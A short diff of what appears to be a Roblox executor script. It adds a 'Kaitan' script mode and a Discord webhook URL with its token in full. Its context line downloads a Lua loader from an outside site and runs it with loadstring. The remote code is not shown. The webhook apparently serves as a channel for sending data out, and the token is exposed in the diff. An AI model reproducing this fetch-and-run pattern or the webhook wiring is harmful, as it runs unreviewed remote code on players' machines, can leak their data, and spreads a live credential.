@@ -1,3 +1,5 @@
+getgenv().ScriptMode = "Kaitan"
+getgenv().Webhook = "https://discord.com/api/webhooks/1412018918125604985/MrooiNam55-2xllRRq98Ca2-vl6aurD9LMXC6XkxMwS-kDbBKqkkpZMDZbHbOlEd7OMZ"
 loadstring(game:HttpGet("https://bonkhub.online/loader.lua",true))()
 
 local player = game.Players.LocalPlayer
